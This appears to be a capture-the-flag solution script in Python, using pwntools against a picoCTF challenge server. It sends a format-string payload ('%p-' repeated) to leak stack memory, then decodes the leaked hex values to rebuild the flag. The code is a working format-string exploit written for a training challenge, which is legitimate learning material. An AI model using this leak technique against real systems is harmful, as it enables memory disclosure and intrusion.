from pwn import *

def little_endian_hex_to_string(hex_string):
    hex_value = hex_string[2:]
    try:
        byte_array = bytes.fromhex(hex_value)[::-1]
        return byte_array.decode('utf-8')
    except:
        pass

r = remote('mimas.picoctf.net', 54315)
r.recvuntil('back to you:\n')
r.sendline('%p-' * 20)
r.recvuntil("Here's your order: ")
stack_leak = r.recvuntil('\n').decode('utf-8')
addresses = stack_leak.split('-')

flag_is_located = 0
flag = ''
for address in addresses:
    value = little_endian_hex_to_string(address)
    if value is None: continue
    if 'pico' in value: 
        flag_is_located = True
    if flag_is_located:
        flag += value
print(flag)
